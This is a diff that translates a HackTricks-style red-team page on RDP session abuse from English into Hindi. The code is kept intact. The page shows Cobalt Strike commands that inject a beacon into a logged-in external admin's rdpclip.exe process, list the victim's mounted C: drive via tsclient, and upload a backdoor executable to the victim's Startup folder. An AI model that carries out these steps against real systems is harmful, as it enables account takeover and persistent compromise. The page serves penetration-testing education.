@@ -1,13 +1,12 @@
-# RDP Sessions Abuse
+# RDP सत्रों का दुरुपयोग
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## RDP Process Injection
+## RDP प्रक्रिया इंजेक्शन
 
-If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.
+यदि **बाहरी समूह** के पास वर्तमान डोमेन में किसी भी **कंप्यूटर** तक **RDP पहुंच** है, तो एक **हमलावर** उस **कंप्यूटर को समझौता कर सकता है और उसका इंतजार कर सकता है**।
 
-Once that user has accessed via RDP, the **attacker can pivot to that users session** and abuse its permissions in the external domain.
-
+एक बार जब उस उपयोगकर्ता ने RDP के माध्यम से पहुंच प्राप्त कर ली, तो **हमलावर उस उपयोगकर्ता के सत्र पर पिवट कर सकता है** और बाहरी डोमेन में इसकी अनुमतियों का दुरुपयोग कर सकता है।
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -23,23 +22,21 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
- PID   PPID  Name                         Arch  Session     User
- ---   ----  ----                         ----  -------     -----
- ...
- 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+...
+4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-
-Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+चेक करें **अन्य उपकरणों के साथ सत्र चुराने के अन्य तरीके** [**इस पृष्ठ में।**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-If a user access via **RDP into a machine** where an **attacker** is **waiting** for him, the attacker will be able to **inject a beacon in the RDP session of the user** and if the **victim mounted his drive** when accessing via RDP, the **attacker could access it**.
+यदि एक उपयोगकर्ता **RDP के माध्यम से एक मशीन** में प्रवेश करता है जहाँ एक **हमलावर** उसके लिए **इंतज़ार** कर रहा है, तो हमलावर **उपयोगकर्ता के RDP सत्र में एक बीकन इंजेक्ट** करने में सक्षम होगा और यदि **पीड़ित ने RDP के माध्यम से पहुँचते समय अपना ड्राइव माउंट किया** है, तो **हमलावर उसे एक्सेस कर सकता है**।
 
-In this case you could just **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.
-
+इस मामले में आप बस **पीड़ित के** **मूल कंप्यूटर** को **बैकडोर** लिखकर **समझौता** कर सकते हैं **स्टार्टअप फ़ोल्डर** में।
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -48,10 +45,10 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
- PID   PPID  Name                         Arch  Session     User
- ---   ----  ----                         ----  -------     -----
- ...
- 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+...
+4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 
@@ -59,18 +56,16 @@ beacon> inject 4960 x64 tcp-local
 ## \\tsclient\c is the C: drive on the origin machine of the RDP session
 beacon> ls \\tsclient\c
 
- Size     Type    Last Modified         Name
- ----     ----    -------------         ----
-          dir     02/10/2021 04:11:30   $Recycle.Bin
-          dir     02/10/2021 03:23:44   Boot
-          dir     02/20/2021 10:15:23   Config.Msi
-          dir     10/18/2016 01:59:39   Documents and Settings
-          [...]
+Size     Type    Last Modified         Name
+----     ----    -------------         ----
+dir     02/10/2021 04:11:30   $Recycle.Bin
+dir     02/10/2021 03:23:44   Boot
+dir     02/20/2021 10:15:23   Config.Msi
+dir     10/18/2016 01:59:39   Documents and Settings
+[...]
 
 # Upload backdoor to startup folder
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
-
